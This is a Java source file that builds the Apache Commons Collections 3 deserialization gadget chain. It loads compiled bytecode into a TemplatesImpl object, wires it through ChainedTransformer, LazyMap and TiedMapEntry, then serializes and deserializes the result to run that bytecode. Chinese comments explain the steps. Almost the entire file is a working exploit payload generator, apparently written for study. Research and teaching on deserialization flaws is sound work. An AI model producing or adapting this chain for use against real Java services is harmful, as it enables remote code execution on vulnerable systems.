package CommonsCollections3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

// 不限制JDK版本
public class CC3 {
    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, NoSuchMethodException {
        TemplatesImpl templates = new TemplatesImpl();
        Class c = TemplatesImpl.class;
        // 设置_name不为空
        Field nameField = c.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        // 定义字节码，反射修改_bytecodes的值
        byte[] code = Files.readAllBytes(Paths.get("D:\\04\\target\\classes\\outCalc.class"));
        byte[][] codes = {code};
        Field bytecodesField = c.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates,codes);
        // _tfactory赋值
        Field tfactoryField = c.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());
//        调用测试
//        templates.newTransformer();
        Transformer[] transformedMaps = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),
        };

        // ysoserialze
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformedMaps);

        Map lazyMap = LazyMap.decorate(new HashMap(), chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(new ConcurrentHashMap(1), "aaa");

        HashMap hashMap = new HashMap();

        hashMap.put(tiedMapEntry,"bbb");
        // 传入的tiedMapEntry
        Class c2 = TiedMapEntry.class;
        Field map = c2.getDeclaredField("map");
        map.setAccessible(true);
        map.set(tiedMapEntry,lazyMap);

        serialize(hashMap);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        return obj;
    }
}
